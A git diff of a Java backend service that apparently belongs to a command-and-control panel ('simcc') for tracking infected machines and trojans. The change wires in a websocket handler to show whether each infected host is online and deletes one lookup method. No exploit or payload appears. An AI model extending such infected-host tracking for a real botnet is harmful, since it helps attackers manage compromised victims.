@@ -1,6 +1,7 @@
 package at.simcc.simcc_backend.api.service;
 
 import at.simcc.simcc_backend.api.body.InfectedRegistrationRequest;
+import at.simcc.simcc_backend.api.ws.WebsocketHandler;
 import at.simcc.simcc_backend.entities.Infected;
 import at.simcc.simcc_backend.entities.InfectedIP;
 import at.simcc.simcc_backend.entities.Trojan;
@@ -30,6 +31,7 @@ public class InfectedService {
     private final InfectedRepository infectedRepository;
 
     private final InfectedMapper infectedMapper;
+    private final WebsocketHandler websocketHandler;
 
     /**
      * Register a new infected machine using a {@code ccid}
@@ -60,19 +62,12 @@ public class InfectedService {
                                 .build()
                 )).orElseGet(List::of)
         );
+
         Infected saved = infectedRepository.save(
                 infected
         );
+
         return Optional.of(infectedMapper.toDtoId(saved));
-    }
-
-
-    public Optional<Infected> getInfectedComplete(UUID iid) {
-        List<Infected> infectedList =  infectedRepository.findFirstByIid(iid);
-        if (infectedList.isEmpty()) {
-            return Optional.empty();
-        }
-        return Optional.of(infectedList.getFirst());
     }
 
     /**
@@ -83,6 +78,9 @@ public class InfectedService {
         List<Infected> infectends = infectedRepo.findAll();
         List<InfectedWithLatestIPDto> infectedDtos = new ArrayList<>();
         for (Infected infected : infectends){
+            infected.setOnline(
+                    websocketHandler.isConnected(infected.getIid())
+            );
             InfectedWithLatestIPDto infectedWithLatestIPDto
                     = infectedMapper.toInfectedWIthLatestIPDto(infected);
 
